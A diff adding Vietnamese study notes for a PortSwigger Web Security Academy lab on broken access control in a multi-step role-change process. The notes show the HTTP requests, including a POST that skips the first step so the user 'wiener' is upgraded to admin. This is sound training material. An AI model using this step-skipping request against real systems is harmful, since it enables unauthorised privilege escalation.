@@ -273,6 +273,37 @@ Hal Pline: Do one!
 ```
 - Lấy **password** cả `carlos` và đăng nhập
 
+### Lab: Multi-step process with no access control on one step 
+#### Analysis
+- Login bằng tài khoản `admin`
+- Sử dụng chức năng `change-roles`, thao tác sẽ theo các bước:
+    - Change roles
+    ```http
+    POST /admin-roles HTTP/2
+    Host: 0a09006203ca667a815848bd00ac005b.web-security-academy.net
+    ...
+    action=upgrade&username=wiener
+    ```
+    - Confirm change roles
+    ```http
+    POST /admin-roles HTTP/2
+    Host: 0a09006203ca667a815848bd00ac005b.web-security-academy.net
+    ...
+    action=upgrade&confirmed=true&username=wiener
+    ```
+    - Khác nhau ở param confirm
+
+#### Exploit
+- Login bằng người dùng `wiener`
+- Thực hiện chức năng `change-roles` nhưng chỉ thực hiện ở bước `Confirm change roles`, bỏ qua `Change roles`
+```http
+POST /admin-roles HTTP/2
+Host: 0a09006203ca667a815848bd00ac005b.web-security-academy.net
+...
+action=upgrade&confirmed=true&username=wiener
+```
+- Do hệ thống không kiểm soát truy cập ở bước này nên request được chấp nhận.
+
 ---
 Goodluck! 🍀🍀🍀 
 
